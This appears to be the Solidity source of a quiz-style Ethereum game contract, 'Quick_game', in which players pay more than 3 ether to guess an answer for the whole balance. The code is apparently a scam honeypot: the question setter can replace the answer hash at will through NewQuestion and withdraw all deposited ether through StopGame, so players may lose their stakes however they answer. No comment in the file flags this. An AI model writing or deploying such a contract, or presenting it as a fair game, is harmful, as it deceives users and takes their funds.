1 pragma solidity ^0.4.25;
2 
3 contract Quick_game
4 {
5     function Try(string _response) external payable {
6         require(msg.sender == tx.origin);
7         
8         if(responseHash == keccak256(_response) && msg.value > 3 ether)
9         {
10             msg.sender.transfer(this.balance);
11         }
12     }
13     
14     string public question;
15     
16     address questionSender;
17     
18     bytes32 responseHash;
19  
20     bytes32 questionerPin = 0x081a05ad67c3f9ec588a859d4e03febee8a6c09f8d29831bd7d7628819194b55;
21  
22     function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
23         if(keccak256(_questionerPin)==questionerPin) 
24         {
25             responseHash = keccak256(_response);
26             question = _question;
27             questionSender = msg.sender;
28             questionerPin = 0x0;
29         }
30     }
31     
32     function StopGame() public payable {
33         require(msg.sender==questionSender);
34         msg.sender.transfer(this.balance);
35     }
36     
37     function NewQuestion(string _question, bytes32 _responseHash) public payable {
38         if(msg.sender==questionSender){
39             question = _question;
40             responseHash = _responseHash;
41         }
42     }
43     
44     function newQuestioner(address newAddress) public {
45         if(msg.sender==questionSender)questionSender = newAddress;
46     }
47     
48     
49     function() public payable{}
50 }